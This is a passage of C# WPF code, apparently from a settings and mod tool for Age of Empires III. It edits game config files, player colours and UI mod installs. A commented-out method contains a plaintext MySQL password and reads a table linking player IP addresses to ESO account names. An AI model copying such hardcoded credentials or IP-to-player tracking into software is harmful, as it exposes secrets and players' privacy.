                    xs.Serialize(wr, FullIP);
                }
                Debug.WriteLine("Saved to xml");
            }
            finally
            {
                await connection.CloseAsync();
            }
        }*/

        /*  async Task Download()
          {
              MySqlConnection connection = new MySqlConnection("SERVER=127.0.0.1;PORT=3306;UID=XaKOps;PASSWORD=2007Add313;DATABASE=XaKOps$default");
              try
              {
                  XmlSerializer xs = new XmlSerializer(typeof(ObservableCollection<Row>));
                  if (File.Exists("UNSAVED.xml"))
                  {
                      using (StreamReader rd = new StreamReader("UNSAVED.xml"))
                      {
                          FullIP = xs.Deserialize(rd) as ObservableCollection<Row>;
                      }
                      Debug.WriteLine("Loaded from xml");
                      File.Delete("UNSAVED.xml");
                  }
                  await connection.OpenAsync();
                  string sql = "SELECT * FROM IPandESO";
                  MySqlCommand command = new MySqlCommand(sql, connection);
                  DbDataReader reader = await command.ExecuteReaderAsync();
                  while (await reader.ReadAsync())
                  {
                      var R = new Row()
                      {
                          IP = IPAddress.Parse(reader[0].ToString()).ToString(),
                          ESO = reader[1].ToString()
                      };
                      if (R.IP != "" && R.ESO != "")
                          if (FullIP.Any(p => p.ESO == R.ESO && p.IP == R.IP) == false)
                              FullIP.Add(R);
                      Debug.WriteLine(IPAddress.Parse(reader[0].ToString()).ToString() + " " + reader[1].ToString());
                  }
                  reader.Close();
              }
              catch
              {
                  Debug.WriteLine("MySQL error");
                  XmlSerializer xs = new XmlSerializer(typeof(ObservableCollection<Row>));
                  if (File.Exists("UNSAVED.xml"))
                  {
                      using (StreamReader rd = new StreamReader("UNSAVED.xml"))
                      {
                          FullIP = xs.Deserialize(rd) as ObservableCollection<Row>;
                      }
                      Debug.WriteLine("Loaded from xml");
                  }
              }
              finally
              {
                  await connection.CloseAsync();
              }
          }*/

        private void Window_Closing(object sender, CancelEventArgs e)
        {
            //await Upload();


            string json = JsonConvert.SerializeObject(Friends);
            File.WriteAllText(System.IO.Path.Combine(FriendPath, "FriendList.json"), json);

            Environment.Exit(0);
        }


        private void Label_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (!string.IsNullOrEmpty((sender as TextBlock).Text))
                Process.Start("http://eso-community.net/ladder.php?player=" + (sender as TextBlock).Text);
        }

        private void Button_Click_5(object sender, RoutedEventArgs e)
        {
            try
            {
                App.Language = new CultureInfo("ru-RU");
            }
            catch { }
        }

        private void Button_Click_6(object sender, RoutedEventArgs e)
        {
            try
            {
                App.Language = new CultureInfo("en-US");
            }
            catch { }
        }

        private void Button_Click_7(object sender, RoutedEventArgs e)
        {
            try
            {
                App.Language = new CultureInfo("uk-UA");
            }
            catch { }
        }

        private void Button_Click_8(object sender, RoutedEventArgs e)
        {
            try
            {
                App.Language = new CultureInfo("fr-FR");
            }
            catch { }
        }

        private void Button_Click_9(object sender, RoutedEventArgs e)
        {
            try
            {
                App.Language = new CultureInfo("de-DE");
            }
            catch { }
        }








        ///////////////////
        ///////////
        /////
        ////
        // MODES
        ////
        /////
        ///////////////////

        private string FFilePath { get; set; }
        public string FilePath
        {
            get { return FFilePath; }
            set
            {
                FFilePath = value;
                NotifyPropertyChanged("FilePath");
            }
        }

        public string GetMD5(string FileName)
        {
            using (var md5 = MD5.Create())
            {
                using (var stream = File.OpenRead(FileName))
                {
                    return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", "‌​").ToLower();
                }
            }
        }
        private PropertyInfo[] FColors { get; set; }

        public PropertyInfo[] Colors
        {
            get { return FColors; }
            set
            {
                FColors = value;
                NotifyPropertyChanged("Colors");
            }
        }

        private SolidColorBrush FP1 { get; set; }
        public SolidColorBrush P1
        {
            get { return FP1; }
            set
            {
                FP1 = value;
                NotifyPropertyChanged("P1");
            }
        }
        private SolidColorBrush FP2 { get; set; }
        public SolidColorBrush P2
        {
            get { return FP2; }
            set
            {
                FP2 = value;
                NotifyPropertyChanged("P2");
            }
        }
        private SolidColorBrush FP3 { get; set; }
        public SolidColorBrush P3
        {
            get { return FP3; }
            set
            {
                FP3 = value;
                NotifyPropertyChanged("P3");
            }
        }
        private SolidColorBrush FP4 { get; set; }
        public SolidColorBrush P4
        {
            get { return FP4; }
            set
            {
                FP4 = value;
                NotifyPropertyChanged("P4");
            }
        }
        private SolidColorBrush FP5 { get; set; }
        public SolidColorBrush P5
        {
            get { return FP5; }
            set
            {
                FP5 = value;
                NotifyPropertyChanged("P5");
            }
        }
        private SolidColorBrush FP6 { get; set; }
        public SolidColorBrush P6
        {
            get { return FP6; }
            set
            {
                FP6 = value;
                NotifyPropertyChanged("P6");
            }
        }
        private SolidColorBrush FP7 { get; set; }
        public SolidColorBrush P7
        {
            get { return FP7; }
            set
            {
                FP7 = value;
                NotifyPropertyChanged("P7");
            }
        }
        private SolidColorBrush FP8 { get; set; }
        public SolidColorBrush P8
        {
            get { return FP8; }
            set
            {
                FP8 = value;
                NotifyPropertyChanged("P8");
            }
        }
        private SolidColorBrush FP9 { get; set; }
        public SolidColorBrush P9
        {
            get { return FP9; }
            set
            {
                FP9 = value;
                NotifyPropertyChanged("P9");
            }
        }
        private SolidColorBrush FP10 { get; set; }
        public SolidColorBrush P10
        {
            get { return FP10; }
            set
            {
                FP10 = value;
                NotifyPropertyChanged("P10");
            }
        }
        private SolidColorBrush FP11 { get; set; }
        public SolidColorBrush P11
        {
            get { return FP11; }
            set
            {
                FP11 = value;
                NotifyPropertyChanged("P11");
            }
        }

        private Cursor FAoE { get; set; }
        public Cursor AoE
        {
            get { return FAoE; }
            set
            {
                FAoE = value;
                NotifyPropertyChanged("AoE");
            }
        }





        private SolidColorBrush GetFromRGB(string s)
        {

            return new SolidColorBrush(Color.FromRgb(Byte.Parse(s.Split(' ')[0]), Byte.Parse(s.Split(' ')[1]), Byte.Parse(s.Split(' ')[2])));
        }

        private string GetRValue(SolidColorBrush c)
        {
            return ((Color)c.GetValue(SolidColorBrush.ColorProperty)).R.ToString();
        }
        private string GetGValue(Brush c)
        {
            return ((Color)c.GetValue(SolidColorBrush.ColorProperty)).G.ToString();
        }
        private string GetBValue(Brush c)
        {
            return ((Color)c.GetValue(SolidColorBrush.ColorProperty)).B.ToString();
        }

        private void SaveXML()
        {
            XmlDocument doc = new XmlDocument();

            XmlDeclaration xmlDec = doc.CreateXmlDeclaration("1.0", "utf-8", null);
            XmlElement root = doc.DocumentElement;
            doc.InsertBefore(xmlDec, root);

            XmlElement Node = doc.CreateElement(string.Empty, "playercolors", string.Empty);
            doc.AppendChild(Node);

            XmlElement Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "0");
            Color.SetAttribute("color1", "130 80 0");
            Color.SetAttribute("color2", "140 90 10");
            Color.SetAttribute("color3", "77 51 0");
            Color.SetAttribute("minimap", "114 94 55");
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "1");
            Color.SetAttribute("color1", GetRValue(P1) + " " + GetGValue(P1) + " " + GetBValue(P1));
            Color.SetAttribute("color2", GetRValue(P1) + " " + GetGValue(P1) + " " + GetBValue(P1));
            Color.SetAttribute("color3", GetRValue(P1) + " " + GetGValue(P1) + " " + GetBValue(P1));
            Color.SetAttribute("minimap", GetRValue(P1) + " " + GetGValue(P1) + " " + GetBValue(P1));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "2");
            Color.SetAttribute("color1", GetRValue(P2) + " " + GetGValue(P2) + " " + GetBValue(P2));
            Color.SetAttribute("color2", GetRValue(P2) + " " + GetGValue(P2) + " " + GetBValue(P2));
            Color.SetAttribute("color3", GetRValue(P2) + " " + GetGValue(P2) + " " + GetBValue(P2));
            Color.SetAttribute("minimap", GetRValue(P2) + " " + GetGValue(P2) + " " + GetBValue(P2));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "3");
            Color.SetAttribute("color1", GetRValue(P3) + " " + GetGValue(P3) + " " + GetBValue(P3));
            Color.SetAttribute("color2", GetRValue(P3) + " " + GetGValue(P3) + " " + GetBValue(P3));
            Color.SetAttribute("color3", GetRValue(P3) + " " + GetGValue(P3) + " " + GetBValue(P3));
            Color.SetAttribute("minimap", GetRValue(P3) + " " + GetGValue(P3) + " " + GetBValue(P3));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "4");
            Color.SetAttribute("color1", GetRValue(P4) + " " + GetGValue(P4) + " " + GetBValue(P4));
            Color.SetAttribute("color2", GetRValue(P4) + " " + GetGValue(P4) + " " + GetBValue(P4));
            Color.SetAttribute("color3", GetRValue(P4) + " " + GetGValue(P4) + " " + GetBValue(P4));
            Color.SetAttribute("minimap", GetRValue(P4) + " " + GetGValue(P4) + " " + GetBValue(P4));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "5");
            Color.SetAttribute("color1", GetRValue(P5) + " " + GetGValue(P5) + " " + GetBValue(P5));
            Color.SetAttribute("color2", GetRValue(P5) + " " + GetGValue(P5) + " " + GetBValue(P5));
            Color.SetAttribute("color3", GetRValue(P5) + " " + GetGValue(P5) + " " + GetBValue(P5));
            Color.SetAttribute("minimap", GetRValue(P5) + " " + GetGValue(P5) + " " + GetBValue(P5));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "6");
            Color.SetAttribute("color1", GetRValue(P6) + " " + GetGValue(P6) + " " + GetBValue(P6));
            Color.SetAttribute("color2", GetRValue(P6) + " " + GetGValue(P6) + " " + GetBValue(P6));
            Color.SetAttribute("color3", GetRValue(P6) + " " + GetGValue(P6) + " " + GetBValue(P6));
            Color.SetAttribute("minimap", GetRValue(P6) + " " + GetGValue(P6) + " " + GetBValue(P6));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "7");
            Color.SetAttribute("color1", GetRValue(P7) + " " + GetGValue(P7) + " " + GetBValue(P7));
            Color.SetAttribute("color2", GetRValue(P7) + " " + GetGValue(P7) + " " + GetBValue(P7));
            Color.SetAttribute("color3", GetRValue(P7) + " " + GetGValue(P7) + " " + GetBValue(P7));
            Color.SetAttribute("minimap", GetRValue(P7) + " " + GetGValue(P7) + " " + GetBValue(P7));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "8");
            Color.SetAttribute("color1", GetRValue(P8) + " " + GetGValue(P8) + " " + GetBValue(P8));
            Color.SetAttribute("color2", GetRValue(P8) + " " + GetGValue(P8) + " " + GetBValue(P8));
            Color.SetAttribute("color3", GetRValue(P8) + " " + GetGValue(P8) + " " + GetBValue(P8));
            Color.SetAttribute("minimap", GetRValue(P8) + " " + GetGValue(P8) + " " + GetBValue(P8));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "9");
            Color.SetAttribute("color1", "0 0 0");
            Color.SetAttribute("color2", "10 10 10");
            Color.SetAttribute("color3", "35 35 35");
            Color.SetAttribute("minimap", "0 0 0");
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "10");
            Color.SetAttribute("color1", "180 250 190");
            Color.SetAttribute("color2", "190 255 200");
            Color.SetAttribute("color3", "202 227 204");
            Color.SetAttribute("minimap", "179 251 186");
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "11");
            Color.SetAttribute("color1", "80 80 80");
            Color.SetAttribute("color2", "90 90 90");
            Color.SetAttribute("color3", "124 124 124");
            Color.SetAttribute("minimap", "80 80 80");
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "player", string.Empty);
            Color.SetAttribute("num", "12");
            Color.SetAttribute("color1", "255 0 100");
            Color.SetAttribute("color2", "255 10 110");
            Color.SetAttribute("color3", "174 87 122");
            Color.SetAttribute("minimap", "255 0 102");
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "friendorfoeself", string.Empty);
            Color.SetAttribute("color1", GetRValue(P9) + " " + GetGValue(P9) + " " + GetBValue(P9));
            Color.SetAttribute("color2", GetRValue(P9) + " " + GetGValue(P9) + " " + GetBValue(P9));
            Color.SetAttribute("color3", GetRValue(P9) + " " + GetGValue(P9) + " " + GetBValue(P9));
            Color.SetAttribute("minimap", GetRValue(P9) + " " + GetGValue(P9) + " " + GetBValue(P9));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "friendorfoeally", string.Empty);
            Color.SetAttribute("color1", GetRValue(P10) + " " + GetGValue(P10) + " " + GetBValue(P10));
            Color.SetAttribute("color2", GetRValue(P10) + " " + GetGValue(P10) + " " + GetBValue(P10));
            Color.SetAttribute("color3", GetRValue(P10) + " " + GetGValue(P10) + " " + GetBValue(P10));
            Color.SetAttribute("minimap", GetRValue(P10) + " " + GetGValue(P10) + " " + GetBValue(P10));
            Node.AppendChild(Color);

            Color = doc.CreateElement(string.Empty, "friendorfoeenemy", string.Empty);
            Color.SetAttribute("color1", GetRValue(P11) + " " + GetGValue(P11) + " " + GetBValue(P11));
            Color.SetAttribute("color2", GetRValue(P11) + " " + GetGValue(P11) + " " + GetBValue(P11));
            Color.SetAttribute("color3", GetRValue(P11) + " " + GetGValue(P11) + " " + GetBValue(P11));
            Color.SetAttribute("minimap", GetRValue(P11) + " " + GetGValue(P11) + " " + GetBValue(P11));
            Node.AppendChild(Color);

            using (RegistryKey R = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
            {
                object P = R.GetValue("setuppath");
                if (P != null)
                {
                    doc.Save(Path.Combine(P.ToString(), "Data", "playercolors.xml"));
                }
            }
        }








        private void miMsecs_Checked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                    {
                        bool NotExist = true;
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            NotExist = S.IndexOf("showMilliseconds") == -1;
                        }
                        if (NotExist)
                            using (StreamWriter w = new StreamWriter(Path.Combine(P.ToString(), "Startup", "user.cfg"), true))
                            {
                                w.WriteLine("showMilliseconds");
                            }
                    }
                }
            }
            catch { }
        }

        private void miMsecs_Unchecked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            S.Remove("showMilliseconds");
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg"), S.ToArray());
                        }
                }
            }
            catch { }
        }

        private void miIntro_Checked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                    {
                        bool NotExist = true;
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            NotExist = S.IndexOf("noIntroCinematics") == -1;
                        }
                        if (NotExist)
                            using (StreamWriter w = new StreamWriter(Path.Combine(P.ToString(), "Startup", "user.cfg"), true))
                            {
                                w.WriteLine("noIntroCinematics");
                            }
                    }
                }
            }
            catch { }
        }

        private void miIntro_Unchecked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            S.Remove("noIntroCinematics");
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg"), S.ToArray());
                        }
                }
            }
            catch { }
        }

        private void miFPS_Checked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                    {
                        bool NotExist = true;
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            NotExist = S.IndexOf("showFPS") == -1;
                        }
                        if (NotExist)
                            using (StreamWriter w = new StreamWriter(Path.Combine(P.ToString(), "Startup", "user.cfg"), true))
                            {
                                w.WriteLine("showFPS");
                            }
                    }
                }
            }
            catch { }
        }

        private void miFPS_Unchecked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            S.Remove("showFPS");
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg"), S.ToArray());
                        }
                }
            }
            catch { }
        }

        private void miRotator_Checked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                    {
                        bool NotExist = true;
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.con")))
                        {
                            string M = File.ReadAllText(Path.Combine(P.ToString(), "Startup", "user.con"));
                            NotExist = !M.Contains("uiWheelRotatePlacedUnit");
                        }
                        if (NotExist)
                            using (StreamWriter w = new StreamWriter(Path.Combine(P.ToString(), "Startup", "user.con"), true))
                            {
                                w.WriteLine("map(\"mousez\", \"building\", \"uiWheelRotatePlacedUnit\")");
                            }
                    }
                }
            }
            catch { }
        }

        private void miRotator_Unchecked(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.con")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.con")).ToList();
                            S.RemoveAt(S.FindIndex(x => x.EndsWith("uiWheelRotatePlacedUnit\")")));
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.con"), S.ToArray());
                        }
                }
            }
            catch { }
        }


        private void udMax_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            int z1 = S.FindIndex(x => x.StartsWith("maxZoom="));
                            if (z1 >= 0)
                                S.RemoveAt(z1);
                            S.Add("maxZoom=" + Math.Round(udMax.Value).ToString());
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg"), S.ToArray());
                        }
                        else
                        {
                            using (StreamWriter w = new StreamWriter(Path.Combine(P.ToString(), "Startup", "user.cfg"), true))
                            {
                                w.WriteLine("maxZoom=" + Math.Round(udMax.Value).ToString());
                            }
                        }

                }
            }
            catch { }
        }



        private void Button_Click_6m(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
                {
                    object P = AS.GetValue("setuppath");
                    if (P != null)
                        if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                        {
                            udMax.ValueChanged -= udMax_ValueChanged;

                            udMax.Value = 60;

                            udMax.ValueChanged += udMax_ValueChanged;

                            List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                            int z1 = S.FindIndex(x => x.StartsWith("maxZoom="));
                            if (z1 >= 0)
                                S.RemoveAt(z1);
                            int z2 = S.FindIndex(x => x.StartsWith("normalZoom="));
                            if (z2 >= 0)
                                S.RemoveAt(z2);
                            int z3 = S.FindIndex(x => x.StartsWith("minZoom="));
                            if (z3 >= 0)
                                S.RemoveAt(z3);
                            File.WriteAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg"), S.ToArray());
                        }
                        else
                        {
                            udMax.ValueChanged -= udMax_ValueChanged;

                            udMax.Value = 60;

                            udMax.ValueChanged += udMax_ValueChanged;

                        }

                }
            }
            catch { }
        }

        private void RadioButton_Checked(object sender, RoutedEventArgs e)
        {
            if (gInterface != null)
                gInterface.Visibility = Visibility.Visible;
        }

        private void RadioButton_Unchecked(object sender, RoutedEventArgs e)
        {
            gInterface.Visibility = Visibility.Collapsed;
        }



        private void RadioButton_Checked_2(object sender, RoutedEventArgs e)
        {
            gMods.Visibility = Visibility.Visible;
        }

        private void RadioButton_Unchecked_2(object sender, RoutedEventArgs e)
        {
            gMods.Visibility = Visibility.Collapsed;

        }

        private void colorList_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            try
            {
                P1 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_1(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P2 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_2(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P3 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_3(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P4 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_4(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P5 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_5(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P6 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_6(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P7 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_7(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P8 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_8(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P9 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_9(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P10 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void colorList_SelectionChanged_10(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                P11 = (SolidColorBrush)(e.AddedItems[0] as PropertyInfo).GetValue(null, null);
                SaveXML();
            }
            catch { }
        }

        private void Button_Clickm(object sender, RoutedEventArgs e)
        {
            try
            {
                using (RegistryKey R = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = R.GetValue("setuppath");
                    if (P != null)
                    {
                        if (File.Exists(Path.Combine(P.ToString(), "Data", "playercolors.xml")))
                            File.Delete(Path.Combine(P.ToString(), "Data", "playercolors.xml"));
                    }
                }


                P1.Color = Color.FromRgb(45, 45, 245);
                P2.Color = Color.FromRgb(210, 40, 40);
                P3.Color = Color.FromRgb(215, 215, 30);
                P4.Color = Color.FromRgb(150, 15, 250);
                P5.Color = Color.FromRgb(15, 210, 80);
                P6.Color = Color.FromRgb(255, 150, 5);
                P7.Color = Color.FromRgb(150, 255, 240);
                P8.Color = Color.FromRgb(255, 190, 255);

                P9.Color = Color.FromRgb(75, 75, 230);
                P10.Color = Color.FromRgb(215, 215, 30);
                P11.Color = Color.FromRgb(230, 40, 40);
            }
            catch { }

        }

        private async void RadioButton_Checked_3(object sender, RoutedEventArgs e)
        {
            rbEkantaUI.IsEnabled = false;
            rbJammsUI.IsEnabled = false;
            rbQazUI.IsEnabled = false;
            rbRemoveUI.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        if (!Paths.isQazInstalled())
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.UI.QazUI.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                                }));
                            }
                        }
                    }
                }
            }
            catch
            { }
            rbEkantaUI.IsEnabled = true;
            rbJammsUI.IsEnabled = true;
            rbQazUI.IsEnabled = true;
            rbRemoveUI.IsEnabled = true;
        }

        private void rbQazUI_Unchecked(object sender, RoutedEventArgs e)
        {
            rbEkantaUI.IsEnabled = false;
            rbJammsUI.IsEnabled = false;
            rbQazUI.IsEnabled = false;
            rbRemoveUI.IsEnabled = false;
            try
            {
                Paths.RemovesQazIfInstalled();
            }
            catch
            { }
            rbEkantaUI.IsEnabled = true;
            rbJammsUI.IsEnabled = true;
            rbQazUI.IsEnabled = true;
            rbRemoveUI.IsEnabled = true;
        }

        private void rbJammsUI_Unchecked(object sender, RoutedEventArgs e)
        {
            rbEkantaUI.IsEnabled = false;
            rbJammsUI.IsEnabled = false;
            rbQazUI.IsEnabled = false;
            rbRemoveUI.IsEnabled = false;
            try
            {
                Paths.RemoveJammsIfInstalled();
            }
            catch
            { }
            rbEkantaUI.IsEnabled = true;
            rbJammsUI.IsEnabled = true;
            rbQazUI.IsEnabled = true;
            rbRemoveUI.IsEnabled = true;
        }

        private void rbEkantaUI_Unchecked(object sender, RoutedEventArgs e)
        {
            rbEkantaUI.IsEnabled = false;
            rbJammsUI.IsEnabled = false;
            rbQazUI.IsEnabled = false;
            rbRemoveUI.IsEnabled = false;
            try
            {
                Paths.RemoveEkantaIfInstalled();
            }
            catch
            { }
            rbEkantaUI.IsEnabled = true;
            rbJammsUI.IsEnabled = true;
            rbQazUI.IsEnabled = true;
            rbRemoveUI.IsEnabled = true;
        }

        private async void rbEkantaUI_Checked(object sender, RoutedEventArgs e)
        {
            rbEkantaUI.IsEnabled = false;
            rbJammsUI.IsEnabled = false;
            rbQazUI.IsEnabled = false;
            rbRemoveUI.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        if (!Paths.isEkantaInstalled())
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.UI.EkantaUI.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                                }));
                            }
                        }
                    }
                }
            }
            catch
            { }
            rbEkantaUI.IsEnabled = true;
            rbJammsUI.IsEnabled = true;
            rbQazUI.IsEnabled = true;
            rbRemoveUI.IsEnabled = true;
        }

        private async void rbJammsUI_Checked(object sender, RoutedEventArgs e)
        {
            rbEkantaUI.IsEnabled = false;
            rbJammsUI.IsEnabled = false;
            rbQazUI.IsEnabled = false;
            rbRemoveUI.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        if (!Paths.isJammsInstalled())
                        {
